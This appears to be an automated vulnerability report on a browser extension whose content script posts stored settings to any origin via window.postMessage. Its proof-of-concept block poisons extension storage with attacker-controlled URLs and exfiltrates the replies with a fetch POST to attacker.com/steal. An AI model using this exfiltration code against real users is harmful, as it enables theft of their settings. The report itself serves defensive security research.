# CoCo Analysis: lkgcfobnmghhbhgekffaadadhmeoindg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lkgcfobnmghhbhgekffaadadhmeoindg/opgen_generated_files/cs_0.js
Line 418-491

**Code:**

```javascript
// Content script - Line 467-491 (actual extension code)
const storage = () => (typeof browser === "undefined" ? chrome.storage.local : browser.storage.local);

function init(items) {
  var s = document.createElement("script");
  s.src = chrome.runtime.getURL("app/bundle.js");
  s.onload = function () {
    this.remove();
  };

  (document.head || document.documentElement).appendChild(s);

  window.addEventListener("message", (event) => {
    if (event.data.type == "getSettings") {
      window.postMessage(
        {
          type: "setSettings",
          value: items, // ← attacker-controlled via storage poisoning
        },
        "*", // ← sent to any origin
      );
    }
  });
}

// Storage data flows into init function
storage().get(["whitelist", "toggleProxy", "proxyUrl"], (items) => init(items));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Storage poisoning + Information disclosure via postMessage

**Attack:**

```javascript
// Step 1: Attacker poisons storage (assuming another vulnerability or compromised state)
chrome.storage.local.set({
  whitelist: "https://attacker.com",
  toggleProxy: true,
  proxyUrl: "https://attacker-proxy.com"
});

// Step 2: Trigger content script on any page
// Step 3: From webpage, send message to content script
window.postMessage({type: "getSettings"}, "*");

// Step 4: Content script responds with poisoned storage data
// The attacker's webpage receives the storage data including whitelist, toggleProxy, and proxyUrl
window.addEventListener("message", (event) => {
  if (event.data.type === "setSettings") {
    console.log("Stolen settings:", event.data.value);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(event.data.value)
    });
  }
});
```

**Impact:** Complete storage exploitation chain - attacker can read sensitive extension settings (whitelist, proxy configuration) by triggering a message event. The webpage's injected script sends a "getSettings" message, and the content script responds by posting all storage data back to the webpage via postMessage with wildcard origin "*", allowing any attacker-controlled page to retrieve this data.
